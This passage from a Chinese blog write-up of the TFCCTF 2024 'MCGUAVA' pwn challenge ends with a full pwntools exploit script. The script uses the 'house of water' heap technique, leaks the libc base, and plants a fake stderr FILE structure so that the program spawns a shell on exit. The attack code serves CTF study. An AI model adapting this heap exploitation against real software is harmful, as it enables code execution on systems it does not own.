<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) </span><br><span class="line">add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br></pre></td></tr></table></figure>
<p>获取 libc 地址后我们可以吧刚才申请在 tcache_perthread_struct 上的堆块释放掉再重新申请回来，然后在 tcache_perthread_struct 上存储 0x250 大小 tcache 最后一个 chunk 的地方写上 <em>IO_2_1_stderr</em>  的地址，并申请 0x250 大小的堆块在 <em>IO_2_1_stderr</em> 上写上 fake file</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">86</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) </span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">    <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br></pre></td></tr></table></figure>
<p>最后让程序通过 exit 函数退出即可执行我们的 fsop 攻击<br>下面给出完整 exp，exp 写的比较乱且注释上对堆块的标号有点不太准确，请师傅们多多包容😇</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">            env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这两个循环为多余操作，当时脑抽写的，后面懒的删了</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 fake 0x30 和 unsorted_start 堆块的索引</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 fake 0x20 和 unsorted_end 堆块的索引</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 unsorted_middle 的索引</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 fake unsorted chunk （size、fd、bk）</span></span><br><span class="line">    add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">    add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">    free(<span class="number">29</span>)</span><br><span class="line">    free(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">    add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">    free(<span class="number">33</span>)</span><br><span class="line">    add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end</span></span><br><span class="line">    free(<span class="number">24</span>)</span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">    add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">    free(<span class="number">37</span>)</span><br><span class="line">    add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">    free(<span class="number">39</span>) </span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">    free(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在后面填充堆块，并伪造 prev_size 和 size 使 fake unsorted chunk 合法</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">        add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br><span class="line">    <span class="comment"># 提前让 0x240、0x250 两个大小的堆块进入到 tcache，后面会用上</span></span><br><span class="line">    add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">    add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">    free(<span class="number">78</span>)</span><br><span class="line">    free(<span class="number">79</span>)</span><br><span class="line">    <span class="comment"># 依次释放 unsorted_end、unsorted_middle、unsorted_start</span></span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    free(<span class="number">27</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk</span></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">    free(<span class="number">80</span>)</span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">    free(<span class="number">81</span>)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        add(<span class="number">0x500</span>) <span class="comment"># 82</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将多余的 largebin 申请出来</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 83</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 84</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 85</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>) <span class="comment"># 86</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    libc_base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(libc_base)[<span class="number">2</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(libc_base)[<span class="number">3</span>] != <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 释放 tcache_perthread_struct 上的堆块，使我们能够再次编辑该结构体</span></span><br><span class="line">    free(<span class="number">86</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 令 size 为 0x250 的 tcache 指向 _IO_2_1_stderr_</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) <span class="comment"># 87</span></span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">        <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">        <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">        <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在 _IO_2_1_stderr_ 上写上我们的 fake file</span></span><br><span class="line">    add(<span class="number">0x240</span>,<span class="number">0</span>,fake_file)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 退出程序，执行 fsop 攻击</span></span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>由于需要分别在 heapbase 和 stdout 上进行一次爆破，所以脚本执行的成功率为 1&#x2F;256，运行后还要等半天</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/18.png" class="" title="我的图图呢">
<p>打通，完结散花🐂🍺</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-water"><span class="toc-number">1.</span> <span class="toc-text">house of water</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Demo"><span class="toc-number">1.2.</span> <span class="toc-text">Attack Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-water-c"><span class="toc-number">1.2.1.</span> <span class="toc-text">house_of_water.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TFCCTF-2024-MCGUAVA"><span class="toc-number">2.</span> <span class="toc-text">TFCCTF 2024 MCGUAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ida%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.1.</span> <span class="toc-text">ida伪代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.0.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%A0%86%E5%9D%97%E7%B4%A2%E5%BC%95"><span class="toc-number">2.0.3.</span> <span class="toc-text">获取堆块索引</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%83%BD%E5%A4%9F%E4%BF%AE%E6%94%B9-unsorted-start-%E5%92%8C-unsorted-end-%E7%9A%84%E5%A0%86%E5%9D%97"><span class="toc-number">2.0.4.</span> <span class="toc-text">获取能够修改 unsorted_start 和 unsorted_end 的堆块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-fake-unsorted-chunk-%E7%9A%84prev-size-%E5%92%8C-size"><span class="toc-number">2.0.5.</span> <span class="toc-text">伪造 fake unsorted chunk 的prev_size 和 size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.0.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&text=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&is_video=false&description=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=house of water &amp; TFCCTF 2024 MCGUAVA&body=Check out this article: https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&name=house of water &amp; TFCCTF 2024 MCGUAVA&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&t=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
